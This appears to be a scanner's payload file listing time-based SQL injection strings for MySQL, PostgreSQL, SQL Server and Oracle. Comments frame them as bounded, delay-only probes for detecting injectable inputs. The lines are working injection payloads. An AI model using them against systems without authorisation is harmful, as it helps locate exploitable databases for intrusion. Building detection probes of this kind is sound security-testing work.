# Time-based SQLi payloads (docs/DESIGN.md §7.3: "inject a bounded sleep/WAITFOR
# and flag on a latency delta above threshold"). %B is the baseline value; %N is
# the bounded sleep seconds the probe substitutes (small and capped - never
# unbounded). Every payload is a pure DELAY: it sleeps, it does not write. The
# probe re-tests to reject jitter (docs/DESIGN.md §7.3: "time-based checks
# re-test to reduce false positives from jitter").

# --- MySQL / MariaDB (SLEEP) ---
%B' AND SLEEP(%N)-- -
%B AND SLEEP(%N)
%B' OR SLEEP(%N)-- -
%B'||SLEEP(%N)||'

# --- PostgreSQL (pg_sleep, non-stacked, read-only) ---
%B' AND 1=(SELECT 1 FROM PG_SLEEP(%N))-- -

# --- Microsoft SQL Server (WAITFOR DELAY - a pure wait, named in §7.3) ---
%B';WAITFOR DELAY '0:0:%N'-- -

# --- Oracle (DBMS_PIPE.RECEIVE_MESSAGE - a bounded receive timeout) ---
%B' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',%N)-- -
